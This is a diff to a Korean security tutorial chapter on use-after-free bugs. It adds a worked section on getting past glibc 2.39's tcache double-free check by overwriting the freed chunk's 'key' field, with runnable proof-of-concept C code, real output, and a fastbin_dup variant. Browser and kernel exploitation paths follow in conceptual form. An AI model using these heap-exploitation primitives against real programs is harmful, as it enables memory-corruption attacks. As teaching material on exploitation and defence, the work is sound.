@@ -377,7 +377,59 @@ MiraclePtr의 동작 원리는 Chromium 문서 [raw_ptr.md](https://github.com/c
 | 참조 카운트 포화(`refcount_t`) | 포화는 오버플로형만 막는다. `put` 과다형(조기 해제)은 그대로 통한다 |
 | MiraclePtr | `raw_ptr<T>`로 바뀌지 않은 포인터(스택 지역 변수, 일부 서드파티 코드)를 통해 접근하는 경로를 찾는다 |
 
-### 7.1 재할당 제어의 조건
+### 7.1 한 사례의 실제 우회 과정: tcache double free 검출(`key`) 통과
+
+표의 둘째 줄을 끝까지 따라간다. 1.4절의 `free(): double free detected in tcache 2`는 glibc가 가장 단순한 double free를 잡는 모습이었다. 검사가 **무엇을 보는지** 알면 통과시키는 데 한 줄이면 된다. 2.39의 `malloc.c`에서 `free`는 청크를 tcache에 넣기 전에 `e->key == tcache_key`인지 본다. `key`는 해제된 청크의 사용자 데이터 **8~15번째 바이트**(`tcache_entry.key`, 첫 8바이트는 `next`)이고, `tcache_key`는 프로세스 시작 때 뽑은 랜덤 값이다. 같으면 "방금 해제된 청크일지 모른다"고 보고 bin을 순회해 같은 청크가 있으면 중단한다. **다르면 순회 자체를 하지 않는다.** 즉 첫 `free` 뒤에 `key`를 아무 값으로든 덮어 두면 두 번째 `free`가 통과한다.
+
+```c
+/* dfree_key.c — tcache double free 검출(key)을 덮어써 통과시킨다 */
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+
+int main(int argc, char **argv) {
+    uint64_t *p = malloc(24);               /* 0x20 청크 → tcache[0x20] */
+    free(p);                                /* p[0] = next(가려짐), p[1] = key = tcache_key */
+    printf("after free : next=%#lx key=%#lx\n", p[0], p[1]);
+    if (argc > 1)
+        p[1] = 0;                           /* ❌ UAF 쓰기로 key를 지운다 → 검사 대상에서 빠진다 */
+    free(p);                                /* 두 번째 free. key가 그대로면 abort */
+    uint64_t *a = malloc(24);
+    uint64_t *b = malloc(24);
+    printf("a=%p b=%p %s\n", (void *)a, (void *)b, a == b ? "<- 같은 청크를 두 번 받았다" : "");
+    return 0;
+}
+```
+
+```
+$ gcc -g -O0 -o dfree_key dfree_key.c
+$ ./dfree_key                                    # key를 건드리지 않고 두 번 free
+free(): double free detected in tcache 2
+Aborted (core dumped)                            ← exit 134 (SIGABRT)
+$ ./dfree_key x                                  # 첫 free 뒤 key를 0으로
+after free : next=0x5586ca163 key=0xc7725dc65870be05
+a=0x5586ca1632a0 b=0x5586ca1632a0 <- 같은 청크를 두 번 받았다
+```
+
+첫 줄의 `next=0x5586ca163`은 리스트 끝(NULL)을 safe-linking으로 가린 값, 즉 `pos >> 12`다([4장 4.3절](04-heap.md)). `key`는 실행마다 다르다(랜덤). 두 번째 `free`가 통과하면 bin에 같은 청크가 두 번 들어가고(`p -> p`), 이어지는 `malloc` 두 번이 **같은 주소**를 돌려준다. 프로그램에 UAF가 없어도 공격자가 UAF를 **만들어 낸** 것이다. 이 뒤는 4.2절과 같다. `a`를 옛 타입 객체로, `b`를 공격자 데이터로 쓰면 1.3절의 타입 혼동이 된다. 또는 `a`를 받은 뒤에도 `p`가 bin에 남아 있으므로 `a`의 첫 8바이트에 가린 포인터를 쓰면 [4장 7.1절](04-heap.md)의 tcache poisoning으로 바로 이어진다.
+
+**조건 세 가지.** (1) **크기 클래스**: 요청이 tcache 범위(청크 0x20~0x410)여야 `free`가 tcache로 간다. 여기서는 `malloc(24)` → 0x20. (2) **tcache 수**: 그 bin에 이미 7개가 차 있으면 `free`는 fastbin(≤0x80) 또는 unsorted bin으로 가고 검사가 달라진다. (3) **쓰기 위치**: 첫 `free` 뒤 사용자 데이터 +8에 1바이트라도 쓸 수 있어야 한다. 해제된 객체에 "이름"이나 "상태"를 쓰는 UAF 쓰기, 또는 바로 앞 청크의 오버플로가 그 역할을 한다.
+
+**버전과의 관계**(glibc `malloc.c` 태그별 소스로 확인). 2.26~2.28에는 `key` 필드가 없어 검사 자체가 없다(how2heap의 `tcache_dup`, 지금은 obsolete). 2.29가 `e->key = tcache`(tcache 구조체 포인터)로 검사를 도입했고, 2.34가 `tcache_key`를 `getrandom`으로 뽑은 랜덤 값으로 바꿨다. 랜덤이 된 것은 "`key`를 원래 값으로 **되돌려** 검사를 속이는" 경로를 막기 위한 것이지, "다른 값으로 **덮는**" 경로는 2.29부터 2.39까지 그대로 통한다. 검사가 "같으면 의심"이지 "다르면 거부"가 아니기 때문이다.
+
+tcache가 7개로 찼을 때의 대안이 fastbin이다. fastbin의 double free 검사는 **꼭대기 하나**만 본다(`double free or corruption (fasttop)`, `old == p`). 사이에 다른 청크 하나를 끼우면 통과한다.
+
+```c
+/* fastbin_dup.c 핵심 — tcache[0x20]을 7개로 채운 뒤 */
+free(a); free(b); free(a);                   /* fastbin: a -> b -> a. 꼭대기가 b일 때 a를 또 넣는다 */
+for (int i = 0; i < 7; i++) malloc(24);      /* tcache를 비우면 다음부터 fastbin에서 나온다 */
+void *x = malloc(24), *y = malloc(24), *z = malloc(24);
+/* x=0x55a53908e2a0 y=0x55a53908e2c0 z=0x55a53908e2a0 <- x와 z가 같은 청크 (glibc 2.39 실측) */
+```
+
+두 방법 모두 glibc 2.39(Ubuntu 24.04)에서 그대로 동작한다. 기법별 전제조건과 차단 버전은 [4장 7.2절](04-heap.md)의 표에 모아 두었다.
+
+### 7.2 재할당 제어의 조건
 
 4.2에서 `malloc(24)` 한 번이 바로 옛 청크를 돌려준 것은 세 조건이 우연히 다 맞았기 때문이다. 실제 제품에서는 공격자가 이 셋을 **만들어야** 한다.
 
@@ -389,7 +441,7 @@ MiraclePtr의 동작 원리는 Chromium 문서 [raw_ptr.md](https://github.com/c
 
 세 조건이 모두 성립하면 5절의 2′단계가 확정되고, 공격자 데이터가 민감 필드 오프셋에 닿는지(3′)는 레이아웃 계산 문제가 된다.
 
-### 7.2 브라우저와 커널에서는 왜 어렵고 어떻게 하는가 (개념)
+### 7.3 브라우저와 커널에서는 왜 어렵고 어떻게 하는가 (개념)
 
 **브라우저**는 창(타이밍)은 넓고 크기 제어도 쉬운 대신, 할당자가 UAF를 겨냥해 설계됐다. Chromium PartitionAlloc은 **타입·크기별로 파티션을 나눠** 다른 종류의 객체가 같은 자리를 재사용하기 어렵게 하고, MiraclePtr(`raw_ptr<T>`)이 참조되는 동안 해제된 메모리의 재사용을 막는다(6절). 그래서 익스플로잇은 (1) `raw_ptr`로 감싸지지 않은 포인터 경로(스택 지역 변수, 서드파티 코드, JS 엔진 내부)를 고르고, (2) 같은 파티션에 들어가는 **같은 타입 또는 호환 크기의 객체**를 스프레이하며, (3) 함수 포인터를 바로 덮는 대신 **길이 필드**를 키워 임의 읽기·쓰기 프리미티브를 먼저 만든다. 뒤 단계는 [10장 7절](10-type-confusion.md)의 JS 엔진 흐름과 같아진다. 렌더러 코드 실행 뒤에도 샌드박스가 남으므로, 보고서에서 "렌더러 UAF"와 "샌드박스 탈출"을 구분한다.
 
@@ -453,3 +505,4 @@ MiraclePtr의 동작 원리는 Chromium 문서 [raw_ptr.md](https://github.com/c
 | 2026-10-22 | 기술 검증: CVE 6건 cvelistV5 대조(모두 실존, 제품·버전·참조 링크 일치). uaf.c를 ASan 유무·`s = NULL`·함수 포인터 변형으로 재실행. ASan 보고서의 소스 줄 번호를 실측값(15/12/9)으로 정정, 4단계의 gdb 설명(비정규 주소라 `call` 명령에서 멈춤) 보완 | 검증팀 |
 | 2026-10-22 | 독자 테스트 반영: 4.2절을 해제→재할당→함수 포인터 호출 경로 변경까지의 완결 실습(uaf2.c, `-no-pie` 빌드·페이로드·gdb 출력 실측, PIE 대조)으로 교체, 5절 표에 2′·3′·4′ 조건 추가, 7절에 재할당 제어 조건(크기·bin·타이밍)과 브라우저·커널 개념 추가, 10장 타입 혼동 교차 링크, 장 참조 표기 정리 | @anthonynoh5202 |
 | 2026-10-23 | 기술 검증(2차): uaf2.c를 본문 플래그로 재빌드해 1~5단계 재실행(`nm` win=0x401204, 같은 주소 재할당, 페이로드로 win 도달, gdb `p *s`·`x/4gx`(0x1011)·`call *%rdx`, PIE 빌드 SIGSEGV) 모두 일치. 7.1 재할당 조건표(tcache 16바이트 bin·7개 상한), 7.2의 MiraclePtr(`raw_ptr.md`의 격리·ref-count 서술)·PartitionAlloc·슬랩 캐시·`CONFIG_SLAB_FREELIST_RANDOM`/`RANDOM_KMALLOC_CACHES`(mm/Kconfig v6.6)·kCFI(arch/Kconfig v6.1 `CFI_CLANG`) 대조. 수정 없음 | 검증팀 |
+| 2026-10-23 | 독자 테스트 2차 반영: 7절에 7.1 "tcache double free 검출(`key`) 통과" 실측 추가(`dfree_key.c` 17줄, glibc 2.39에서 abort 대조군과 `key` 덮기 통과·같은 청크 두 번 할당 출력, 크기 클래스·tcache 수·쓰기 위치 조건, 2.26~2.28 무검사·2.29 `e->key = tcache`·2.34 랜덤 `tcache_key`를 `malloc.c` 태그별 소스로 대조, fastbin `fasttop` 대안 실측). 기존 7.1·7.2를 7.2·7.3으로 번호 조정 | @anthonynoh5202 |
